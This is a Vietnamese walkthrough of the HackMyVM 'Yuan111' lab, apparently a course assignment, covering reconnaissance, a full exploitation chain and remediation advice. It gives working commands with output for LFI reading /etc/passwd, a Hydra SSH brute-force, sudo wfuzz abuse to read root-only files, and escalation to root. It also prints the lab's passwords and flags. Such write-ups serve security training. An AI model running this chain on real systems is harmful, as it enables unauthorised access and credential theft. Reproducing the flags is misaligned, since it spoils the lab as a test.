# HackMyVM — Yuan111

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Yuan111 (Target) | `10.0.2.5` |
| Hostname | `111` |
| SSH | `22/tcp` — OpenSSH 8.4p1 Debian 5+deb11u3 |
| HTTP | `80/tcp` — Apache 2.4.62 (Debian) |
| Tài khoản | `tao` |
| Mật khẩu SSH | `rockyou` |
| User flag | `flag{user-21747e1ca09bfcc4f2551263db0f3dff}` |
| Credential từ `/root/111.txt` | `q6I42RCMyMkDV45svyuF` |
| Root flag | `flag{root-9bbd7af2a042a901b92dc203b3896621}` |

> **Quy ước 3 terminal**
>
> - 🟦 **Terminal Kali**: scan, HTTP enumeration, Hydra và SSH.
> - 🟥 **Terminal Yuan111**: sau khi SSH thành công với `tao` — kiểm tra quyền, chạy `wfuzz`, `su -`.
> - 🟩 **Terminal Yuan111 ROOT**: sau khi `su -` thành công — đọc root flag.
>
> **Không chạy nhầm lệnh giữa các terminal.**

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định Target và kiểm tra kết nối

### 🟦 Kali

```bash
nmap -sn 10.0.2.0/24
```

Target của bài:

```text
10.0.2.5
```

Kiểm tra kết nối:

```bash
ping -c 4 10.0.2.5
```

Kết quả:

```text
4 packets transmitted, 4 received, 0% packet loss
```

Máy Target đang hoạt động và có thể kết nối từ Kali.

---

## 1.2. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.5
```

Kết quả:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Chỉ có 2 cổng TCP mở:

```text
22/tcp → SSH
80/tcp → HTTP
```

---

## 1.3. Nhận diện dịch vụ và phiên bản

### 🟦 Kali

```bash
nmap -sC -sV -Pn -T4 -p22,80 10.0.2.5
```

Kết quả quan trọng:

```text
22/tcp open  ssh   OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp open  http  Apache httpd 2.4.62 (Debian)
```

Trang web có tiêu đề:

```text
Rockyou.txt - 密码字典文件介绍
```

---

## 1.4. Xác định điểm vào

```text
22/tcp  SSH
80/tcp  HTTP (Apache)
        └── /file.php  ← điểm vào chính (LFI)
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác LFI trên web → brute-force SSH → đăng nhập `tao` → khai thác `sudo wfuzz` → đọc credential root → `su -` lên root → lấy `root.txt`.**

## 2.1. Kiểm tra HTTP

### 🟦 Kali

```bash
curl -I http://10.0.2.5
```

```bash
curl -s http://10.0.2.5 | head -n 30
```

Kết quả xác nhận Apache đang phục vụ trang web.

---

## 2.2. Enumeration bằng Gobuster

### 🟦 Kali

```bash
gobuster dir -u http://10.0.2.5 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,php,html
```

Các kết quả đáng chú ý:

```text
file.php             (Status: 200) [Size: 0]
index.html           (Status: 200) [Size: 20592]
server-status        (Status: 403)
```

Điểm quan trọng nhất:

```text
file.php
```

---

## 2.3. Khai thác LFI qua `file.php`

### 🟦 Kali

Kiểm tra endpoint:

```bash
curl -i http://10.0.2.5/file.php
```

Kết quả:

```text
HTTP/1.1 200 OK
Content-Length: 0
```

Thử tham số `file` với `/etc/passwd`:

```bash
curl "http://10.0.2.5/file.php?file=/etc/passwd"
```

Kết quả có:

```text
root:x:0:0:root:/root:/bin/bash
...
tao:x:1000:1000:,,,:/home/tao:/bin/bash
```

**Xác nhận:** `file.php` có **Local File Inclusion (LFI)**.

Lọc các user có shell:

```bash
curl -s "http://10.0.2.5/file.php?file=/etc/passwd" | grep "/bin/bash"
```

Kết quả:

```text
root:x:0:0:root:/root:/bin/bash
tao:x:1000:1000:,,,:/home/tao:/bin/bash
```

Tài khoản người dùng có shell:

```text
tao
```

---

## 2.4. Chuẩn bị rockyou.txt và brute-force SSH

### 🟦 Kali

Kiểm tra wordlist:

```bash
ls -lh /usr/share/wordlists/rockyou.txt*
```

Nếu chỉ có file `.gz`, giải nén:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Kiểm tra:

```bash
ls -lh /usr/share/wordlists/rockyou.txt
```

Brute-force SSH:

```bash
hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.5
```

Kết quả thực tế:

```text
[22][ssh] host: 10.0.2.5   login: tao   password: rockyou
```

Credential:

```text
Username: tao
Password: rockyou
```

---

## 2.5. SSH vào Yuan111

### 🟦 Kali

```bash
ssh tao@10.0.2.5
```

Nhập mật khẩu:

```text
rockyou
```

Sau khi đăng nhập thành công, prompt chuyển thành:

```text
tao@111:~$
```

**Từ đây, tiếp tục trong 🟥 TERMINAL YUAN111.**

---

## 2.6. Kiểm tra tài khoản và lấy User Flag

### 🟥 Yuan111

```bash
whoami
```

Kết quả:

```text
tao
```

```bash
id
```

Kết quả:

```text
uid=1000(tao) gid=1000(tao) groups=1000(tao)
```

```bash
pwd
```

Kết quả:

```text
/home/tao
```

Đọc user flag:

```bash
cat user.txt
```

Kết quả:

```text
flag{user-21747e1ca09bfcc4f2551263db0f3dff}
```

Xác nhận vị trí:

```bash
find /home/tao -name user.txt -type f 2>/dev/null
```

Kết quả:

```text
/home/tao/user.txt
```

---

## 2.7. Kiểm tra quyền sudo

### 🟥 Yuan111

```bash
sudo -l
```

Kết quả quan trọng:

```text
User tao may run the following commands on 111:
    (ALL) NOPASSWD: /usr/bin/wfuzz
    (ALL) NOPASSWD: /usr/bin/id
```

Đặc biệt:

```text
/usr/bin/wfuzz
```

được phép chạy bằng `sudo` mà **không cần password**.

Kiểm tra thêm:

```bash
which wfuzz
```

```text
/usr/bin/wfuzz
```

```bash
wfuzz --version
```

```text
3.1.0
```

```bash
ls -l /usr/bin/wfuzz
```

```text
-rwxr-xr-x 1 root root 948 Nov 16 2020 /usr/bin/wfuzz
```

Xác nhận `sudo` thực sự chạy dưới root:

```bash
sudo /usr/bin/id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Nhưng:

```bash
ls -la /root
```

vẫn trả về:

```text
Permission denied
```

→ Cần khai thác khả năng đọc file của `wfuzz`.

---

## 2.8. Khai thác sudo wfuzz để đọc `/root/111.txt`

### 🟥 Yuan111

Kiểm tra payload `file`:

```bash
sudo /usr/bin/wfuzz -e payloads
```

Trong danh sách có:

```text
file | Returns each word from a file.
```

**Kiểm tra trước bằng `--dry-run`:**

```bash
sudo /usr/bin/wfuzz -z file,/root/111.txt --dry-run http://127.0.0.1/FUZZ
```

Kết quả:

```text
Total requests: 1
Payload
"q6I42RCMyMkDV45svyuF"
```

Thực hiện request thật:

```bash
sudo /usr/bin/wfuzz -c -z file,/root/111.txt http://127.0.0.1/FUZZ
```

Kết quả:

```text
404 ... "q6I42RCMyMkDV45svyuF"
```

**Credential thu được từ `/root/111.txt`:**

```text
q6I42RCMyMkDV45svyuF
```

### Vì sao hoạt động?

```text
tao
  │
  └── sudo /usr/bin/wfuzz
             │
             └── wfuzz chạy với UID 0
                        │
                        └── đọc /root/111.txt
```

Tài khoản `tao` không thể `cat /root/111.txt`, nhưng `wfuzz` chạy bằng root nên payload `file` đọc được nội dung.

---

## 2.9. Leo thang lên root bằng `su -`

### 🟥 Yuan111

```bash
su -
```

Khi hỏi:

```text
Password:
```

nhập **chính xác** (không thêm dấu ngoặc kép hay khoảng trắng):

```text
q6I42RCMyMkDV45svyuF
```

Sau khi thành công, prompt chuyển thành:

```text
root@111:~#
```

**Từ đây, tiếp tục trong 🟩 TERMINAL YUAN111 — ROOT.**

---

## 2.10. Xác nhận quyền Root và lấy Root Flag

### 🟩 Yuan111 — ROOT

```bash
whoami
```

Kết quả:

```text
root
```

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
pwd
```

Kết quả:

```text
/root
```

Kiểm tra thư mục `/root`:

```bash
ls -la /root
```

Có:

```text
111.txt
root.txt
```

Đọc root flag:

```bash
cat /root/root.txt
```

Kết quả:

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```

---

## 2.11. Chuỗi khai thác hoàn chỉnh

```text
┌─────────────────────────────┐
│ 🟦 KALI                     │
│ 10.0.2.15                   │
└──────────────┬──────────────┘
               │
               │ Nmap + Gobuster
               ▼
┌─────────────────────────────┐
│ 🟥 YUAN111 10.0.2.5         │
│ 22/tcp SSH                  │
│ 80/tcp HTTP                 │
└──────────────┬──────────────┘
               │
               │ /file.php?file=
               ▼
┌─────────────────────────────┐
│ LFI                         │
│ /etc/passwd → user tao      │
└──────────────┬──────────────┘
               │
               │ Hydra + rockyou
               ▼
┌─────────────────────────────┐
│ SSH                         │
│ tao : rockyou               │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ 🟥 tao@111                  │
│ user.txt                    │
│ sudo -l                     │
│ NOPASSWD: /usr/bin/wfuzz    │
└──────────────┬──────────────┘
               │
               │ wfuzz -z file,/root/111.txt
               ▼
┌─────────────────────────────┐
│ /root/111.txt               │
│ q6I42RCMyMkDV45svyuF        │
└──────────────┬──────────────┘
               │
               │ su -
               ▼
┌─────────────────────────────┐
│ 🟩 root@111                 │
│ uid=0(root)                 │
└──────────────┬──────────────┘
               │
               ▼
┌─────────────────────────────┐
│ /root/root.txt              │
│ ROOT FLAG                   │
└─────────────────────────────┘
```

---

## 2.12. Hai (ba) terminal — làm theo đúng thứ tự

### 🟦 TERMINAL KALI

```bash
# 1. Host discovery
nmap -sn 10.0.2.0/24

# 2. Ping
ping -c 4 10.0.2.5

# 3. Scan TCP
nmap -p- -Pn -T4 10.0.2.5
nmap -sC -sV -Pn -T4 -p22,80 10.0.2.5

# 4. HTTP
curl -I http://10.0.2.5
curl -s http://10.0.2.5 | head -n 30

# 5. Gobuster
gobuster dir -u http://10.0.2.5 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,php,html

# 6. LFI
curl -i http://10.0.2.5/file.php
curl "http://10.0.2.5/file.php?file=/etc/passwd"
curl -s "http://10.0.2.5/file.php?file=/etc/passwd" | grep "/bin/bash"

# 7. Chuẩn bị rockyou + Hydra
ls -lh /usr/share/wordlists/rockyou.txt*
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
ls -lh /usr/share/wordlists/rockyou.txt
hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.5

# 8. SSH
ssh tao@10.0.2.5
# Password: rockyou
```

### 🟥 TERMINAL YUAN111 (tao)

```bash
# 9. Kiểm tra user
whoami
id
pwd
ls -la

# 10. User flag
cat user.txt
find /home/tao -name user.txt -type f 2>/dev/null

# 11. Sudo
sudo -l
which wfuzz
wfuzz --version
ls -l /usr/bin/wfuzz
sudo /usr/bin/id

# 12. Khai thác wfuzz
sudo /usr/bin/wfuzz -e payloads
sudo /usr/bin/wfuzz -z file,/root/111.txt --dry-run http://127.0.0.1/FUZZ
sudo /usr/bin/wfuzz -c -z file,/root/111.txt http://127.0.0.1/FUZZ

# 13. Leo thang
su -
# Password: q6I42RCMyMkDV45svyuF
```

### 🟩 TERMINAL YUAN111 — ROOT

```bash
# 14. Xác nhận root
whoami
id
pwd

# 15. Root flag
ls -la /root
find /root -maxdepth 2 -type f -name '*flag*' -o -name '*.txt' 2>/dev/null
cat /root/root.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục.**

## 3.1. Nguyên nhân chính

### 1. Local File Inclusion (LFI) trên `file.php`

Endpoint cho phép đọc file tùy ý qua tham số `file`:

```text
/file.php?file=/etc/passwd
```

### 2. Password yếu / xuất hiện trong rockyou

Tài khoản `tao` dùng mật khẩu `rockyou` — dễ bị brute-force.

### 3. Sudo misconfiguration cho `wfuzz`

```text
(ALL) NOPASSWD: /usr/bin/wfuzz
```

`wfuzz` hỗ trợ payload `file` → đọc được file nhạy cảm với quyền root.

### 4. Credential root lưu trong file plaintext

File `/root/111.txt` chứa password dùng để `su -`.

---

## 3.2. Biện pháp khắc phục

### Sửa LFI

- Không đưa đường dẫn do người dùng kiểm soát vào hàm đọc file.
- Dùng allowlist / path canonicalization.
- Chặn các path nguy hiểm (`/etc`, `/root`, `..`).

### Gia cố mật khẩu

- Không dùng mật khẩu yếu / có trong wordlist phổ biến.
- Áp dụng policy mật khẩu mạnh.
- Cân nhắc khóa công khai thay vì mật khẩu cho SSH.

### Hạn chế sudo

- Không cấp `NOPASSWD` cho tool có khả năng đọc file tùy ý như `wfuzz`.
- Chỉ whitelist đúng command cần thiết và giới hạn argument nếu có thể.
- Áp dụng Least Privilege.

### Bảo vệ file nhạy cảm

- Không lưu password plaintext trong `/root`.
- Kiểm soát permission chặt chẽ.
- Rotate credential khi phát hiện bị lộ.

### Logging & Monitoring

Theo dõi:

- Request LFI bất thường
- Brute-force SSH
- Sudo invocation của `wfuzz`
- Truy cập `/root`

---

# Kết luận ngắn gọn

## Câu 1

Target:

```text
10.0.2.5 (hostname: 111)
```

Dịch vụ:

```text
22/tcp  SSH — OpenSSH 8.4p1
80/tcp  HTTP — Apache 2.4.62
```

## Câu 2

Chuỗi khai thác:

```text
Gobuster → file.php
      ↓
LFI → /etc/passwd → tao
      ↓
Hydra + rockyou → SSH
      ↓
tao → user.txt
      ↓
sudo wfuzz -z file,/root/111.txt
      ↓
q6I42RCMyMkDV45svyuF
      ↓
su - → root
      ↓
root.txt
```

User flag:

```text
flag{user-21747e1ca09bfcc4f2551263db0f3dff}
```

Root flag:

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```

## Câu 3

Khắc phục trọng tâm:

```text
Sửa LFI
        +
Mật khẩu mạnh / khóa SSH
        +
Không cấp sudo rộng cho wfuzz
        +
Không lưu password plaintext
        +
Least Privilege + Logging
```

---

# Flags

### User Flag

```text
flag{user-21747e1ca09bfcc4f2551263db0f3dff}
```

### Root Flag

```text
flag{root-9bbd7af2a042a901b92dc203b3896621}
```
